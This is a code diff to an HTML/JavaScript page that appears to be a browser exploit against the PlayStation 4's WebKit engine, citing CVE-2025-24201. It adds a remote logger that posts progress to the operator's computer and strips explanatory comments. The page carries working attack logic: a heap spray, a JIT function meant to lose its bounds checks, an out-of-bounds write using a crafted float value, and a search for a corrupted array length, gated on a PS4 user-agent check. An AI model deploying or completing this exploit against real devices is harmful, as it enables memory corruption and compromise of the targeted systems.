@@ -78,19 +78,58 @@
 <div id="log-container"></div>
 
 <script>
-    // --- UTILITIES ---
+    // ==========================================
+    // === REMOTE LOGGER CONFIGURATION (IMPORTANT) ===
+    // ==========================================
+
+    // REPLACE 'YOUR_PC_IP' BELOW WITH YOUR COMPUTER'S LOCAL IP (e.g., '192.168.1.15')
+    const LOG_SERVER_IP = 'YOUR_PC_IP'; 
+    const LOG_PORT = 9000;
+
+    // This function sends logs to your computer
+    function remoteLog(msg, type = 'info') {
+        if (LOG_SERVER_IP === 'YOUR_PC_IP') return; // Don't send if not configured
+
+        const url = `http://${LOG_SERVER_IP}:${LOG_PORT}/log`;
+        const data = {
+            message: msg,
+            type: type,
+            time: new Date().toLocaleTimeString()
+        };
+
+        // Use Image object for fire-and-forget logging (works better on old WebKits than fetch)
+        // or use simple fetch if supported. PS4 usually handles fetch okay, but Image is safer for simple pings.
+        try {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(e => {
+                // Silent fail if server is offline
+            });
+        } catch (e) {}
+    }
+
+    // ==========================================
+    // === UTILITIES & UI LOGGER ===
+    // ==========================================
 
     const logger = {
         el: document.getElementById('log-container'),
         status: document.getElementById('status'),
         
         log: function(msg, type = 'info') {
+            // 1. Show on TV Screen
             const div = document.createElement('div');
             div.className = `log-${type}`;
             div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             this.el.appendChild(div);
-            // Auto-scroll to bottom
             window.scrollTo(0, document.body.scrollHeight);
+
+            // 2. Send to Computer
+            remoteLog(msg, type);
         },
         
         info: function(msg) { this.log(msg, 'info'); },
@@ -100,6 +139,7 @@
         
         setStatus: function(msg) {
             this.status.textContent = `Status: ${msg}`;
+            remoteLog(`STATUS UPDATE: ${msg}`, 'info');
         }
     };
 
@@ -109,19 +149,19 @@
         return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
     }
 
-    // --- EXPLOT CONFIGURATION ---
+    // ==========================================
+    // === EXPLOIT LOGIC (CVE-2025-24201) ===
+    // ==========================================
 
     const CONFIG = {
         SPRAY_SIZE: 0x1000,    // Number of objects to spray
         SPRAY_CHUNK_SIZE: 0x4000, // Size of each chunk
-        TARGET_INDEX: 1337     // Placeholder index for OOB trigger
+        TARGET_INDEX: 1337      // Placeholder index for OOB trigger
     };
 
     let spray_store = [];
 
     // --- STEP 1: HEAP SPRAY ---
-    // This fills memory with predictable data structures to ensure our OOB write
-    // hits something we control (like the length property of an adjacent array).
     
     function sprayHeap() {
         logger.info("Starting Heap Spray...");
@@ -143,9 +183,7 @@
         }
     }
 
-    // --- STEP 2: VULNERABILITY TRIGGER (CVE-2025-24201) ---
-    // This function attempts to trigger the Out-Of-Bounds write.
-    // NOTE: Specific JIT offsets depend on exact firmware revision.
+    // --- STEP 2: VULNERABILITY TRIGGER ---
     
     function triggerOOB() {
         logger.info("Attempting to trigger CVE-2025-24201...");
@@ -157,8 +195,6 @@
         }
         
         // 2. The vulnerable function (JIT Candidate)
-        // This function mimics the pattern found in CVE-2025-24201/24202
-        // where bounds checks are eliminated incorrectly by the optimizer.
         function vulnerable_jit(arr, index, value) {
             // Force JIT compilation
             let tmp = arr[0]; 
@@ -174,20 +210,15 @@
         }
 
         // 4. Trigger the bug
-        // We pass an index that is technically out of bounds, but the JIT
-        // might have removed the check.
         logger.warn("Firing trigger...");
         
         try {
             // TODO: 'CONFIG.TARGET_INDEX' needs to be fuzzed/adjusted for FW 12.50
-            // If successful, this writes a value OUTSIDE the array, hopefully
-            // hitting the 'length' property of the next array in memory.
-            vulnerable_jit(arrays[10], CONFIG.TARGET_INDEX, 2.3023e-320); // 2.3023e-320 is roughly 0x000000XX in hex representation
+            vulnerable_jit(arrays[10], CONFIG.TARGET_INDEX, 2.3023e-320); 
             
             logger.info("Trigger fired. Checking for corruption...");
             
             // 5. Verification
-            // If the OOB write worked, one of our arrays should now have a huge length.
             let exploited_array = null;
             for (let i = 0; i < arrays.length; i++) {
                 if (arrays[i].length > 100) {
@@ -206,7 +237,6 @@
 
         } catch (e) {
             logger.error("Crash/Error during trigger: " + e.message);
-            // On PS4, a crash is often a good sign (it means we touched restricted memory)
             return false;
         }
     }
@@ -224,8 +254,6 @@
         if (ua.indexOf("PlayStation 4") !== -1) {
             logger.success("Target Confirmed: PlayStation 4");
             
-            // Check for 12.50 specifically (Webkit version check)
-            // Note: Update this string matching if 12.50 has a unique identifier
             if (ua.indexOf("AppleWebKit") !== -1) {
                 logger.info("WebKit Engine detected.");
             }
@@ -249,10 +277,8 @@
         }, 100);
     }
     
-    // Auto-run verification on load (optional, commented out for safety)
-    // startExploit();
-
+    // Initial Connection Test
+    logger.info("Page loaded. Logger ready.");
 </script>
 </body>
 </html>
-
